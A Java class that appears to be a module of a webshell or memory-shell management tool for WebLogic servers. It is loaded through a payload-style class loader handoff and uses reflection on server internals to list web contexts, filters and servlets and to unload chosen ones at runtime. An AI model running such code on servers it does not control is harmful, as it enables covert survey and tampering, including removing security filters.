package org.leo.core.component;

import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.*;

public class WeblogicCatalinaManageComponent implements Runnable {
    private HashMap params;
    private HashMap results;
    private static HashSet contexts=getContext();
    private static ClassLoader classLoader=Thread.currentThread().getContextClassLoader();


    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (java.util.HashMap) h.invoke(null, null, null);
            results = new java.util.HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }



    public void invoke() throws Exception {
        String methodName = (String) params.get("methodName");
        if ("getCatalinaInfo".equals(methodName)) {
            results.put("catalinaInfo",getCatalinaInfo());
        }
        if ("unLoadFilter".equals(methodName)) {
            String contextName= (String) params.get("contextName");
            String filterName= (String) params.get("filterName");
            unLoadFilter(contextName,filterName);
        }
        if ("unLoadServlet".equals(methodName)) {
            String contextName= (String) params.get("contextName");
            String filterName= (String) params.get("servletPattern");
            unLoadServlet(contextName,filterName);
        }
        results.put("code", 200);
    }

    public ArrayList getCatalinaInfo() {
        contexts = getContext();
        ArrayList catalinaInfo=new ArrayList();
        for (Object context:contexts) {
            try {
                HashMap contextInfo=new HashMap();
                contextInfo.put("name",getFV(context,"contextName"));
                contextInfo.put("basePath",getFV(context,"contextPath"));
                contextInfo.put("workDir",getFV(context,"docroot"));
                contextInfo.put("allFilter",getAllFilter(context));
                contextInfo.put("allServlet",getAllServlet(context));
                catalinaInfo.add(contextInfo);
            }catch (Exception e){
                e.printStackTrace();
            }
        }
        return catalinaInfo;
    }

    public ArrayList getAllFilter(Object standardContext) {
        try {
            Object filterManager = invokeMethod(standardContext, "getFilterManager");
            HashMap filters= (HashMap) getFV(filterManager,"filters");

            ArrayList filterPatternList= (ArrayList) getFV(filterManager,"filterPatternList");
            ArrayList allFilterInfo=new ArrayList();


            for (Object filterPattern:filterPatternList) {
                HashMap filterInfo=new HashMap();
                String filterName= (String) invokeMethod(filterPattern,"getFilterName");
                String servletName= (String) invokeMethod(filterPattern,"getServletName");
                Object map=invokeMethod(filterPattern,"getMap");
                Object urlPatterns=invokeMethod(map,"keys");
                filterInfo.put("filterName",filterName);
                filterInfo.put("servletName",getFV(filterPattern, servletName));
                filterInfo.put("urlPatterns",urlPatterns);
                Object filter=filters.get(filterName);
                filterInfo.put("filterClass",getFV(filter, "filterClassName"));
                allFilterInfo.add(filterInfo);
            }
            return allFilterInfo;
        } catch (Exception var6) {
            return null;
        }
    }

    public ArrayList getAllServlet(Object standardContext) {
        try {
            Object servletMapping=getFV(standardContext,"servletMapping");
            Map matchMap = (Map)getFV(servletMapping, "matchMap");
            Iterator s = matchMap.keySet().iterator();
            ArrayList servlets=new ArrayList();
            while (s.hasNext()) {
                try {
                    String key = (String)s.next();
                    Object fullMatchNode = matchMap.get(key);
                    Object exactValue=getFV(fullMatchNode,"exactValue");
                    if (exactValue==null){
                        exactValue=getFV(fullMatchNode,"patternValue");
                    }
                    HashMap servletInfo=new HashMap();
                    servletInfo.put("url",invokeMethod(exactValue,"getPattern"));
                    Object servletStub=invokeMethod(exactValue,"getServletStub");
                    servletInfo.put("wrapperName",getFV(servletStub, "name"));
                    servletInfo.put("servletClass",invokeMethod(servletStub,"getClassName"));
                    servlets.add(servletInfo);
                } catch (Exception var9) {
                }
            }
            return servlets;
        } catch (Exception var10) {
            return null;
        }
    }

    public Boolean unLoadFilter(String contextName,String filterName) throws Exception {
        for (Object standardContext:contexts){
            if (contextName.equals(getFV(standardContext,"contextName"))){
                Object filterManager = invokeMethod(standardContext, "getFilterManager");
                HashMap filters= (HashMap) getFV(filterManager,"filters");
                ArrayList filterPatternList= (ArrayList) getFV(filterManager,"filterPatternList");
                filters.remove(filterName);
                for (Object filterPattern:filterPatternList) {
                    if (invokeMethod(filterPattern,"getFilterName").equals(filterName)){
                        filterPatternList.remove(filterPattern);
                    }
                }
            }
        }
        return true;
    }

    public Boolean unLoadServlet(String contextName,String servletPattern) throws Exception {
        for (Object standardContext:contexts){
            if (contextName.equals(getFV(standardContext,"contextName"))){
                Object servletMapping=getFV(standardContext,"servletMapping");
                Map matchMap = (Map)getFV(servletMapping, "matchMap");
                Object fullMatchNode=matchMap.get(servletPattern);
                Object exactValue=getFV(fullMatchNode,"exactValue");
                Object servletStub=invokeMethod(exactValue,"getServletStub");
                invokeMethod(standardContext,"removeServletStub",new Class[]{servletStub.getClass(),boolean.class},new Object[]{servletStub,false});
                invokeMethod(servletMapping,"removePattern",new Class[]{String.class},new Object[]{servletPattern});
            }
        }
        return true;
    }


    public static Object[] getContextsByMbean() throws Throwable {
        HashSet webappContexts = new HashSet();
        Class serverRuntimeClass = Class.forName("weblogic.t3.srvr.ServerRuntime",false,classLoader);
        Class webAppServletContextClass = Class.forName("weblogic.servlet.internal.WebAppServletContext",false,classLoader);
        Method theOneMethod = serverRuntimeClass.getMethod("theOne");
        theOneMethod.setAccessible(true);
        Object serverRuntime = theOneMethod.invoke(null);

        Method getApplicationRuntimesMethod = serverRuntime.getClass().getMethod("getApplicationRuntimes");
        getApplicationRuntimesMethod.setAccessible(true);
        Object applicationRuntimes = getApplicationRuntimesMethod.invoke(serverRuntime);
        int applicationRuntimeSize = Array.getLength(applicationRuntimes);
        for (int i = 0; i < applicationRuntimeSize; i++) {
            Object applicationRuntime = Array.get(applicationRuntimes, i);

            try {
                Method getComponentRuntimesMethod = applicationRuntime.getClass().getMethod("getComponentRuntimes");
                Object componentRuntimes = getComponentRuntimesMethod.invoke(applicationRuntime);
                int componentRuntimeSize = Array.getLength(componentRuntimes);
                for (int j = 0; j < componentRuntimeSize; j++) {
                    Object context = getFV(Array.get(componentRuntimes, j), "context");
                    if (webAppServletContextClass.isInstance(context)) {
                        webappContexts.add(context);
                    }
                }
            } catch (Throwable e) {

            }

            try {
                Set childrenSet = (Set) getFV(applicationRuntime, "children");
                Iterator iterator = childrenSet.iterator();

                while (iterator.hasNext()) {
                    Object componentRuntime = iterator.next();
                    try {
                        Object context = getFV(componentRuntime, "context");
                        if (webAppServletContextClass.isInstance(context)) {
                            webappContexts.add(context);
                        }
                    } catch (Throwable e) {

                    }
                }

            } catch (Throwable e) {

            }
        }
        return webappContexts.toArray();
    }

    public static Object[] getContextsByThreads() throws Throwable {
        HashSet webappContexts = new HashSet();
        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
        int threadCount = threadGroup.activeCount();
        Thread[] threads = new Thread[threadCount];
        threadGroup.enumerate(threads);
        for (int i = 0; i < threadCount; i++) {
            Thread thread = threads[i];
            if (thread != null) {
                Object workEntry = getFV(thread, "workEntry");
                if (workEntry != null) {
                    try {
                        Object context = null;
                        Object connectionHandler = getFV(workEntry, "connectionHandler");
                        if (connectionHandler != null) {
                            Object request = getFV(connectionHandler, "request");
                            if (request != null) {
                                context = getFV(request, "context");
                            }
                        }
                        if (context == null) {
                            context = getFV(workEntry, "context");
                        }

                        if (context != null) {
                            webappContexts.add(context);
                        }
                    } catch (Throwable e) {

                    }
                }
            }
        }
        return webappContexts.toArray();
    }

    public static HashSet getContext() {
        HashSet webappContexts = new HashSet();
        try {
            webappContexts.addAll(Arrays.asList(getContextsByMbean()));
        } catch (Throwable e) {

        }
        try {
            webappContexts.addAll(Arrays.asList(getContextsByThreads()));
        } catch (Throwable e) {

        }
        return webappContexts;
    }



    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }

    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        Method method = null;

        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }

}
